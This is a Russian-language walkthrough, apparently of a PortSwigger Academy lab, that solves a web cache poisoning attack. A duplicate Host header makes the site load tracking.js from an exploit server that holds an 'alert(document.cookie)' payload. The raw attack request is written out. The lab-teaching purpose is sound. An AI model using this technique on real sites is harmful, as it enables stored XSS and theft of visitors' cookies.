Перейдем на уязвимый ресурс и перейдем в `Proxy` -> `HTTP history` и изучим запросы

по заданию известно, что приложение имеет уязвимость в кеше, и нужно действовать через него


увидим запрос на корневую страницу
```
GET /
```
и отправим его в Repeater

и после загрузки корневой страницы он обращается к `/resources/js/tracking.js`
это мы тоже приметим

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/2.%20Web%20cache%20poisoning%20via%20ambiguous%20requests/pics%20for%20walkthrough/1.png)

Далее Перейдем в Repeater и добавим второй заголовок `Host`
```
Host: example.com
```
и увидим, что он пытается подтягивать файл  `resources/js/tracking.js` со стороннего ресурса 
```
//example.com/resources/js/tracking.js
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/2.%20Web%20cache%20poisoning%20via%20ambiguous%20requests/pics%20for%20walkthrough/2.png)
Далее перейдем в Exploit server 

в поле FIle введем `/resources/js/tracking.js`
а в body введем - `alert(document.cookie)`
и нажмем `store`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/2.%20Web%20cache%20poisoning%20via%20ambiguous%20requests/pics%20for%20walkthrough/3.png)
Далее вернемся в `Repeater` и изменим значение второго заголовка `Host` за адрес нашего `Exploit-server
`
```
GET / HTTP/1.1
Host: 0a59005604d8a3a580b9089f007200ee.h1-web-security-academy.net
Host: exploit-0afe006304eba33180df078101fc007b.exploit-server.net
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/2.%20Web%20cache%20poisoning%20via%20ambiguous%20requests/pics%20for%20walkthrough/4.png)

и отправим запрос 

и даже обновив корневую страницу увидим отработавшую XSS атаку

и получим уведомление о выполненной атаке

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/24.%20HTTP%20Host%20header%20attacks/2.%20Web%20cache%20poisoning%20via%20ambiguous%20requests/pics%20for%20walkthrough/5.png)
